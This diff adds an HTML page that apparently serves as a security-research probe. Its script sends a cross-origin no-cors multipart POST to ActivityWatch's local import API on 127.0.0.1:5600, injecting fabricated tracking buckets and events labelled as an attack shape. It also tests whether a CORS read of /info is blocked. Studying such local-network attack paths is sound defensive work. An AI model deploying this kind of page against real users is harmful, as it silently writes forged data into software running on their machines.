@@ -1,0 +1,24 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>R19 LNA probe</title></head><body>
+<h3>R19 ActivityWatch local-API reachability probe</h3>
+<pre id="log"></pre>
+<script>
+const L=(m)=>{document.getElementById('log').textContent+=m+"\n"};
+(async()=>{
+  // Probe 1: simple multipart import (the attack shape) - no-cors
+  try{
+    const payload={"buckets":{
+      "aw-watcher-window_lnaprobe":{"id":"aw-watcher-window_lnaprobe","type":"currentwindow","client":"aw-watcher-window","hostname":"lnaprobe","created":new Date().toISOString(),"data":{},"events":[{"timestamp":new Date().toISOString(),"duration":1800,"data":{"app":"R19-LNA-PROBE","title":"browser-gate test"}}]},
+      "aw-watcher-afk_lnaprobe":{"id":"aw-watcher-afk_lnaprobe","type":"afkstatus","client":"aw-watcher-afk","hostname":"lnaprobe","created":new Date().toISOString(),"data":{},"events":[{"timestamp":new Date().toISOString(),"duration":1800,"data":{"status":"not-afk"}}]}}};
+    const fd=new FormData();
+    fd.append("buckets",new Blob([JSON.stringify(payload)],{type:"application/json"}));
+    const r=await fetch("http://127.0.0.1:5600/api/0/import",{method:"POST",mode:"no-cors",body:fd});
+    L("IMPORT-FETCH: resolved, status="+r.status+" type="+r.type+" (opaque expected; server-side execution is decided by the server, not this response)");
+  }catch(e){L("IMPORT-FETCH: REJECTED: "+e)}
+  // Probe 2: CORS GET (readability check)
+  try{
+    const r2=await fetch("http://127.0.0.1:5600/api/0/info",{mode:"cors"});
+    L("CORS-GET /info: ok status="+r2.status);
+  }catch(e){L("CORS-GET /info: blocked (expected, origin not allowlisted): "+e)}
+  L("DONE origin="+location.origin);
+})();
+</script></body></html>
